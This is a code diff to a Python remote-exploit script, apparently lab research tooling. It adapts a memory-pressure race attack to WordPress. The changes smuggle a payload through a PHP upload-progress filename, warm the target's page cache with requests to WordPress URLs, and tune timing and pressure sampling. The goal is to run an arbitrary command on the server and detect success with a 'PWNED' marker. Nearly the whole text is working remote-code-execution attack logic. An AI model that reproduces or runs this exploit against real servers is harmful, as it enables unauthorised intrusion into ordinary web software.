@@ -237,7 +237,7 @@ def build_payload() -> bytes:
 
 
 def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
-            cmd: str = "id") -> dict:
+            cmd: str = "id", sid: str | None = None) -> dict:
     """One full remote attempt with pre-loaded pressure.
 
     Every verdict inside is a NATURAL signal - the target reports
@@ -247,16 +247,44 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     """
     res = {"h": h, "cmd": cmd}
 
-    sid = lab.sid_new()
+    # one session id for the whole run on WordPress: the carrier
+    # rebuilds whatever the previous attempt left (self-healing), so
+    # exactly one session file exists at a time instead of an
+    # ever-growing pile whose page cache slides the baseline. The bare
+    # app keeps a fresh sid per attempt - the behaviour the green CI
+    # was validated with.
+    if lab.GADGET == "wordpress":
+        sid = sid or lab.sid_new()
+    else:
+        sid = lab.sid_new()
     res["sid"] = sid
 
     # carrier: the progress record the victim will rewrite. There is no
     # way to verify it over HTTP without an oracle - the timing is the
     # same contract the local stages use (hold, then store).
-    carrier, _ = lab.carrier_hold(sid)
-    time.sleep(0.7)
-
-    lab.store_bio(sid, build_payload())
+    carrier2 = None
+    if lab.GADGET == "wordpress":
+        # WordPress slashes every $_POST value (wp_magic_quotes), so the
+        # payload rides an upload-progress filename instead - a channel
+        # PHP writes raw (it unescapes \" itself; see lab.FILLUNIT for
+        # the header-line piece constraint). Two carriers make the file
+        # GROW during the pwrite: the victim rewrites the SMALL first
+        # record (fresh page cache -> new memcg charge -> the OOM lands
+        # inside the splice window), while the payload lives untouched
+        # in the second record. A single record would give |R|-|C| < 0
+        # (the STRUCT bytes) - the write would add no charge at all.
+        carrier, _ = lab.carrier_hold(sid)
+        time.sleep(0.5)
+        carrier2, _ = lab.carrier_hold(
+            sid, filename=lab.filename_payload_wire().decode("latin-1"),
+            cl=8_300_000, token=lab.TOKEN2)
+        time.sleep(0.7)
+        # tiny bio: only the '|' anchor the pad's key-scan ends on.
+        lab.store_bio(sid, b"x")
+    else:
+        carrier, _ = lab.carrier_hold(sid)
+        time.sleep(0.7)
+        lab.store_bio(sid, build_payload())
     time.sleep(0.3)
 
     fillers = filler_open(host, port)
@@ -310,7 +338,9 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
         if out:
             res["output"] = out.decode(errors="replace")
 
-    for s in [carrier, victim]:
+    for s in [carrier, carrier2, victim]:
+        if s is None:
+            continue
         try:
             s.close()
         except OSError:
@@ -332,6 +362,22 @@ def wait_server(host: str, port: int, timeout: float = 20.0) -> bool:
     while time.monotonic() - t0 < timeout:
         try:
             if http_get(host, port, "/", timeout=3):
+                # WordPress-only warm-up (pure HTTP - any client can do
+                # this): fetch a spread of the target's URLs so its code
+                # page cache is both STEADY (same state before every
+                # attempt) and HOT. Hot pages live on the active list and
+                # resist reclaim, which shrinks the evictable "shock
+                # absorber" that otherwise races the write's charge on
+                # heavy targets (WordPress loads ~70% more code than the
+                # bare app). The bare-app targets do not need it and the
+                # extra requests only churn their worker pool.
+                if lab.GADGET == "wordpress":
+                    for path in ("/", "/wp-login.php", "/wp-admin/",
+                                 "/wp-json/", "/?feed=rss2"):
+                        try:
+                            http_get(host, port, path, timeout=3)
+                        except OSError:
+                            pass
                 return True
         except OSError:
             pass
@@ -367,6 +413,17 @@ def _derive(res: dict) -> tuple[str, float]:
         return "nooom", 0.0
     if res.get("victim") in ("eof", "rst"):
         ms = float(res.get("drop_ms") or 0.0)
+        if lab.GADGET == "wordpress":
+            # WordPress's phases are far slower than the bare app's: the
+            # page load + serialisation alone measures ~0.5-1.1s (the
+            # bare app finishes them in 7-108ms), and a pwrite death
+            # lands at >=1.4s. Deaths under 150ms cannot be an OOM at
+            # all - the charge has not crossed yet - they are apache's
+            # watchdog restarting the master after the PREVIOUS attempt's
+            # kill: hold the pressure instead of thrashing the bracket.
+            if ms <= 150.0:
+                return "noise", ms
+            return ("early", ms) if ms <= 1100.0 else ("late", ms)
         return ("early", ms) if ms <= 250.0 else ("late", ms)
     return "noise", 0.0
 
@@ -383,6 +440,11 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
         # the consumer response is the positive signal. No shell file.
         WP_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
         lab.set_gadget("wordpress", f"{command};echo {WP_MARKER}")
+        # shift LEN2 so the payload's structural tail starts exactly on a
+        # FILLUNIT (5120B) header-line piece boundary - PHP would
+        # otherwise truncate the multi-MB filename mid-payload (see
+        # lab.FILLUNIT)
+        lab.wp_align_geometry()
         # WP's resting charge (small pool + ~20MiB code cache) pushes
         # the landable band up to h in (32, 40): 8 fillers give a
         # 56MiB pressure range and an 8MiB-wide band (vs jitter ~2MiB).
@@ -414,14 +476,28 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # Never sample narrower than the band: the bare-app targets have a
     # wide band (4MiB); WordPress's landable slice sits under ~1MiB
     # (its heavy baseline pushes the band down to h in (0, ~1M)).
-    MIN_W = 1_000_000 if chain == "wordpress" else 4_000_000
+    # Sampling floor: never narrow below band + jitter. WordPress's
+    # absorber (cold source page-cache) jitters +-2-4MiB per attempt -
+    # MORE than the h steps - so a converged 1MiB window samples a band
+    # that has already moved (measured: 237 in-zone samples, 0 hits).
+    # 14MiB = the 8MiB k-window + the jitter always stays covered.
+    MIN_W = 14_000_000 if chain == "wordpress" else 4_000_000
     last_signal = None         # "early" = too high | "low" = too low
+    # WordPress cannot be bisected: its death signals do not separate
+    # "pressure too high" from "past the window" (measured: no-write
+    # deaths 1.36-1.89s vs in-write deaths 1.62-1.90s - fully
+    # overlapping), so steering on them thrashes the bracket. The
+    # landing is stochastic anyway and the landable band is only
+    # ~7MiB of h, so sample the whole plausible range uniformly.
+    uniform = chain == "wordpress"
+
+    run_sid = lab.sid_new()   # reused by every attempt (see attempt())
 
     for i in range(1, max_attempts + 1):
         if not wait_server(host, port):
             return {"error": "server unreachable"}
         try:
-            res = attempt(host, port, h, c_len, r_len, command)
+            res = attempt(host, port, h, c_len, r_len, command, run_sid)
         except OSError as e:
             # Transient connection loss (e.g. the target is restarting after
             # an OOM): wait for it to come back and retry instead of dying.
@@ -456,7 +532,21 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
         # of freezing at one edge: inside the flip zone the SAME h can
         # report early on one attempt and nooom on the next (the state
         # jitters), so point convergence stalls.
-        if hi - lo < MIN_W:
+        if lab.GADGET == "wordpress":
+            # WordPress-only refinements (the bare-app trajectory stays
+            # byte-identical): sliding on a noise walks lo/hi toward
+            # whichever edge the random draw touched (measured: repeated
+            # <=150ms watchdog deaths at h_max froze the search in the
+            # storm zone), and at an edge the window must widen inward
+            # instead of collapsing to a point.
+            if out in ("early", "late", "nooom") and hi - lo < MIN_W:
+                if last_signal == "early":
+                    hi = min(h_max, h)
+                    lo = max(h_min, hi - MIN_W)
+                elif last_signal == "low":
+                    lo = max(h_min, min(h, h_max - MIN_W))
+                    hi = min(h_max, lo + MIN_W)
+        elif hi - lo < MIN_W:
             if last_signal == "early":
                 hi = min(h_max, h)
                 lo = max(h_min, hi - MIN_W)
@@ -464,7 +554,15 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                 lo = max(h_min, h)
                 hi = min(h_max, lo + MIN_W)
         # coarse bisection to find the zone, then sample the band
-        if hi - lo >= MIN_W * 2:
+        if uniform:
+            # Observed landable zone (mem_limit 172m): h in ~[38M, 54M].
+            # Below it the write finishes uncrossed (nooom), above it the
+            # charge crosses during serialisation (early) or the filler
+            # push storms (noise) - sampling outside only wastes
+            # attempts.
+            h = random.randint(max(int(h_min), 38_000_000),
+                               min(int(h_max), 54_000_000))
+        elif hi - lo >= MIN_W * 2:
             h = (lo + hi) // 2
         else:
             h = random.randint(int(lo), int(hi))
